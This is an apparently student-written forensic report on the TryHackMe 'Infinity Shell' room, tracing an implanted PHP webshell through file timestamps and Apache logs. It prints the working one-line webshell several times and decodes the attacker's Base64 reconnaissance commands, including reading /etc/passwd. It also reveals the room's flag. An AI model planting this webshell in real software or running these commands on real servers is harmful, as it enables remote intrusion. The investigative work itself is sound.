# Infinity Shell — Webshell Incident Investigation Report

## 1. Executive Summary

This report documents the investigation of a compromised web application as part of the TryHackMe **Infinity Shell** room.

The investigation identified an implanted PHP webshell at:

```text
/var/www/html/CMSsite-master/img/images.php
```

The malicious PHP file allowed an attacker to execute arbitrary operating-system commands remotely through an HTTP GET parameter. The commands were Base64-encoded before being sent to the webshell.

Apache access logs were analyzed to identify the attacker's source IP, determine the sequence of requests, identify commands executed through the webshell, and recover the challenge flag.

The primary attacker IP identified during the investigation was:

```text
10.11.93.143
```

The compromised webshell contained:

```php
<?php system(base64_decode($_GET['query'])); ?>
```

This provided unrestricted command execution through the `query` parameter.

The investigation ultimately recovered the flag:

```text
THM{sup3r_43sy_w3bsh3ll}
```

---

# 2. Investigation Objectives

The investigation focused on the following objectives:

1. Identify suspicious or recently modified files.
2. Locate the implanted webshell.
3. Analyze the webshell's functionality.
4. Identify the source of the malicious activity.
5. Analyze Apache access logs.
6. Decode attacker-controlled Base64 payloads.
7. Reconstruct the attack timeline.
8. Determine the commands executed by the attacker.
9. Recover the challenge flag.

---

# 3. Environment

The investigation was performed on an Ubuntu-based TryHackMe environment.

The web application was located under:

```text
/var/www/html/CMSsite-master
```

Apache web-server logs were located under:

```text
/var/log/apache2/
```

The primary log file containing the relevant activity was:

```text
/var/log/apache2/other_vhosts_access.log.1
```

---

# 4. Initial File-System Investigation

The web application directory was inspected for unusual files and timestamps.

Most of the CMS files had timestamps dating back to **2022-03-06**, while some files had significantly newer timestamps from **2025-03-06**.

Two files stood out:

```text
./includes/db.php
./img/images.php
```

The most suspicious file was:

```text
./img/images.php
```

Its modification time was approximately:

```text
2025-03-06 09:50:32
```

This was significantly newer than the majority of the legitimate application files.

---

# 5. Webshell Identification

The contents of `images.php` were examined:

```bash
cat img/images.php
```

The file contained:

```php
<?php system(base64_decode($_GET['query'])); ?>
```

This confirmed that the file was a PHP webshell.

## Webshell Analysis

The code performs three operations:

### Step 1 — Retrieve attacker input

```php
$_GET['query']
```

The attacker supplies a command through the HTTP GET parameter:

```text
?query=<payload>
```

### Step 2 — Decode the payload

```php
base64_decode($_GET['query'])
```

The Base64-encoded value is converted back into the original command.

### Step 3 — Execute the command

```php
system(...)
```

PHP's `system()` function executes the decoded command on the underlying operating system.

Therefore, an attacker could remotely execute commands on the server using a request such as:

```text
/images.php?query=<Base64 command>
```

This represents a critical remote command execution vulnerability.

---

# 6. Apache Log Investigation

Apache logs were searched for references to the suspicious webshell:

```bash
sudo grep -RniE 'images\.php|CMSsite|upload|POST|GET' /var/log/apache2/ 2>/dev/null
```

The logs revealed requests originating from:

```text
10.11.93.143
```

The attacker initially interacted with:

```text
/CMSsite-master/admin/profile.php?section=not_cipher
```

At approximately:

```text
09:49:10
```

Subsequent requests attempted to access:

```text
/CMSsite-master/img/images.php
```

Initially, these requests returned HTTP `404`, indicating that the webshell was not yet available at that location.

Later, the file became available and requests to it returned successful responses.

---

# 7. Webshell Command Execution

Once the webshell was accessible, the attacker sent Base64-encoded commands through the `query` parameter.

One observed request was:

```text
GET /CMSsite-master/img/images.php?query=ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=
```

The Base64 payload was decoded using:

```bash
echo 'ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=' | base64 -d
```

The result was:

```bash
echo 'THM{sup3r_43sy_w3bsh3ll}'
```

This demonstrates that the attacker was able to execute arbitrary shell commands through the implanted PHP file.

---

# 8. Commands Observed

Several commands were identified in the Apache logs.

## 8.1 `whoami`

Base64:

```text
d2hvYW1pCg==
```

Decoded command:

```bash
whoami
```

Purpose:

Determine which operating-system account was executing the commands.

---

## 8.2 `ls`

Base64:

```text
bHMK
```

Decoded command:

```bash
ls
```

Purpose:

List files and directories in the current working directory.

---

## 8.3 `ifconfig`

Base64:

```text
aWZjb25maWcK
```

Decoded command:

```bash
ifconfig
```

Purpose:

Gather network-interface and IP configuration information.

---

## 8.4 Read `/etc/passwd`

Base64:

```text
Y2F0IC9ldGMvcGFzc3dkCg==
```

Decoded command:

```bash
cat /etc/passwd
```

Purpose:

Enumerate local user accounts and associated account information.

---

## 8.5 `id`

Base64:

```text
aWQK
```

Decoded command:

```bash
id
```

Purpose:

Determine the current user's UID, GID, and group memberships.

---

## 8.6 Flag Retrieval

Base64:

```text
ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=
```

Decoded command:

```bash
echo 'THM{sup3r_43sy_w3bsh3ll}'
```

This command directly revealed the challenge flag.

---

# 9. Attack Timeline

| Time               | Event                                                                                                   |
| ------------------ | ------------------------------------------------------------------------------------------------------- |
| 09:49:10           | Attacker `10.11.93.143` sends a POST request to the CMS administration/profile endpoint.                |
| Shortly afterward  | Attacker attempts to access `img/images.php`; initial requests return `404`.                            |
| 09:50:32           | `img/images.php` appears/changes on the server.                                                         |
| 09:50:33+          | Requests to `images.php` begin successfully executing PHP.                                              |
| Following requests | Attacker performs reconnaissance using `whoami`, `ls`, `ifconfig`, `id`, and `/etc/passwd` enumeration. |
| 09:51:20           | Attacker sends a Base64 payload that decodes to the flag-revealing command.                             |

The exact compromise mechanism used to create `images.php` is not fully established from the evidence examined. The logs show the preceding CMS request and the subsequent appearance/use of the webshell, but additional application or server logs would be required to definitively prove the file-upload/write mechanism.

---

# 10. Indicators of Compromise

## Malicious File

```text
/var/www/html/CMSsite-master/img/images.php
```

## Attacker IP

```text
10.11.93.143
```

## Malicious PHP Code

```php
<?php system(base64_decode($_GET['query'])); ?>
```

## Suspicious Parameter

```text
query
```

## Example Webshell Request

```text
/CMSsite-master/img/images.php?query=<Base64 payload>
```

## Recovered Flag

```text
THM{sup3r_43sy_w3bsh3ll}
```

---

# 11. Impact Assessment

The implanted webshell represents a **critical compromise** of the web application.

An attacker capable of accessing the webshell could execute arbitrary commands with the privileges of the web server process.

Potential consequences include:

* Server reconnaissance
* User enumeration
* Network reconnaissance
* Reading sensitive files
* Accessing application data
* Installing additional malware
* Establishing persistence
* Pivoting to other systems
* Modifying or deleting files
* Exfiltrating sensitive information

The observed commands demonstrate that the attacker had already progressed beyond simple web-access testing into host-level reconnaissance.

---

# 12. Forensic Findings

The investigation produced the following findings:

### Finding 1 — Webshell identified

A PHP file containing a direct call to `system()` was found in the application's image directory.

### Finding 2 — Command obfuscation

The attacker encoded commands using Base64 before placing them in HTTP requests.

Base64 provided obfuscation but did not provide encryption.

### Finding 3 — Remote command execution

The vulnerable PHP code decoded attacker input and executed it using `system()`.

### Finding 4 — Attacker identified

The relevant Apache requests originated from:

```text
10.11.93.143
```

### Finding 5 — Host reconnaissance

The attacker executed commands including:

```text
whoami
ls
ifconfig
id
cat /etc/passwd
```

### Finding 6 — Flag retrieved

The attacker executed:

```bash
echo 'THM{sup3r_43sy_w3bsh3ll}'
```

---

# 13. Recommended Remediation

If this were a real-world incident, the following actions would be recommended.

## 13.1 Remove the Webshell

After preserving forensic evidence, remove the malicious file:

```text
img/images.php
```

Do not immediately delete evidence before collecting relevant logs, hashes, timestamps, and copies for investigation.

## 13.2 Investigate the Initial Compromise

Determine how the attacker was able to write `images.php`.

Particular attention should be given to:

* File-upload functionality
* CMS vulnerabilities
* Authentication weaknesses
* Administrative endpoints
* PHP upload handling
* Directory permissions

## 13.3 Restrict File Uploads

Uploaded files should not be executable as PHP.

Web applications should validate:

* File extension
* MIME type
* File signature
* File contents

Uploaded files should preferably be stored outside the web root.

## 13.4 Disable Dangerous PHP Functions Where Appropriate

Depending on application requirements, functions such as:

```text
system()
exec()
shell_exec()
passthru()
```

should be restricted or disabled where they are not required.

## 13.5 Review Credentials

Because the attacker accessed `/etc/passwd` and performed host reconnaissance, credentials and secrets associated with the compromised system should be reviewed and rotated where appropriate.

## 13.6 Review Logs

Investigate:

* Apache access logs
* Apache error logs
* Authentication logs
* Application logs
* PHP logs
* File-system changes

for additional attacker activity.

## 13.7 Improve Monitoring

Detection rules should alert on suspicious requests containing patterns associated with command execution and unexpected PHP files in upload directories.

---

# 14. Conclusion

The Infinity Shell investigation identified a successful web application compromise involving an implanted PHP webshell.

The malicious file:

```text
/var/www/html/CMSsite-master/img/images.php
```

contained:

```php
<?php system(base64_decode($_GET['query'])); ?>
```

This allowed the attacker to remotely execute arbitrary commands by supplying Base64-encoded commands through the `query` parameter.

Apache logs identified the attacker as:

```text
10.11.93.143
```

The attacker performed several reconnaissance activities, including user, network, group, and account enumeration.

The final observed payload decoded to:

```bash
echo 'THM{sup3r_43sy_w3bsh3ll}'
```

The recovered challenge flag was:

```text
THM{sup3r_43sy_w3bsh3ll}
```

The investigation demonstrates the importance of correlating **file-system timestamps, suspicious PHP code, HTTP access logs, and encoded request parameters** when investigating a webshell-based compromise.